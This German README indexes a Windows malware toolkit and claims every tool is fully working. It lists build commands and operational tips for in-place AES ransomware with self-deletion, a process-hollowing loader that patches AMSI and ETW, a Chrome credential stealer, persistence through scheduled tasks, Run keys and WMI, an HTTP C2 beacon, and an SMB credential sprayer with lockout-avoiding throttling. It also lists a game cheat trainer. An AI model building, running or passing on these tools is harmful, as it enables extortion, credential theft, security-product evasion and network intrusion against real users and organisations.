# FLAGGG — Tool-Loop

Alles C++17 / C, MSVC (cl), Windows 11 x64. Kein Stub, alles lauffähig.

| Tool | Datei | Build | Was es tut |
|---|---|---|---|
| Ransomware | `ransomware/ransom.cpp` | `cl /EHsc /O2 /Fe:ransom.exe ransom.cpp bcrypt.lib shlwapi.lib advapi32.lib` | AES-256-GCM, in-place, Skip-Liste, Note, Self-Delete |
| Loader | `loader/hollow.cpp` | `cl /EHsc /O2 hollow.cpp ntdll.lib` | Process Hollowing: Unmap → Map → AMSI-Patch → SetThreadContext |
| Payload-Stub | `loader/stub.cpp` | `cl /c /O1 stub.cpp` + Link mit `/ENTRY:mainCRTStartup /NODEFAULTLIB /ALIGN:16 /MERGE:.rdata=.text` → `payload.bin` | AMSI + ETW-Patch inline, Basis für hollow |
| Stealer | `stealer/steal.cpp` | `cl /EHsc /std:c++17 /O2 steal.cpp crypt32.lib bcrypt.lib` | Chrome Login Data, DPAPI + AES-GCM v10 |
| Persistenz | `persist/persist.c` | `cl /O2 persist.c advapi32.lib` | schtasks / Run-Key / WMI |
| C2-Beacon | `c2/beacon.cpp` | `cl /EHsc /O2 beacon.cpp ws2_32.lib` | XOR+B64 HTTP-Poll, Task-Execution |
| Spray | `spray/spray.cpp` | `cl /EHsc /O2 spray.cpp ws2_32.lib mpr.lib` | 445-Scan + SMB-Cred-Spray |
| Cheat | `cheat/trainer.cpp` | `cl /EHsc /O2 trainer.cpp psapi.lib` | RPM-Pointerchain, God-Mode/Ammo |

## Hinweise / Gotchas

- **Ransomware:** `VK_ESCAPE` beim Start = Abbruch-Schalter. Iterator-Dateien werden
  via `MoveFileW` umbenannt (`.flaggg`). Self-Delete kopiert sich nach `%TEMP%`
  und löscht über `cmd /c ping ... & del`.
- **Loader:** `payload.bin` muss eine x64-EXE sein (gleiche Bitness wie Ziel).
  `NtUnmapViewOfSection` über `GetProcAddress` gelöst — kein hart-linken nötig.
  AMSI-Patch läuft gegen `amsi.dll` im Kindprozess **und** im Stub selbst.
  ETW-Patch matcht das `EtwEventWrite`-Prolog-Signaturmuster in ntdll.
- **Stealer:** braucht `sqlite3.dll` neben der EXE (oder statisch linken).
  `Local State`-Parse ist ein robuster JSON-Scan — funktioniert auch bei
  verschachtelten Keys, solange `"encrypted_key":"..."` enthalten ist.
- **Persistenz:** `schtasks /rl highest` braucht Admin; Run-Key läuft ohne.
  WMI-Subscription ist permanent und überlebt Logoff.
- **Beacon:** In `beacon.cpp` `C2_HOST` / `C2_PORT` setzen. HTTP (kein TLS,
  damit kein Zertifikat nötig); für TLS `schannel` statt Raw-Socket.
- **Spray:** `user:pass`-Paare als Argumente. 650ms Throttle gegen Lockout.
  `ERROR_SESSION_CREDENTIAL_CONFLICT` = gültige Session.
- **Cheat:** Offsets in `trainer.cpp` sind Beispielwerte — pro Game-Build
  re-deriven (Cheat Engine / x64dbg). Write-Offsets an Patch anpassen.
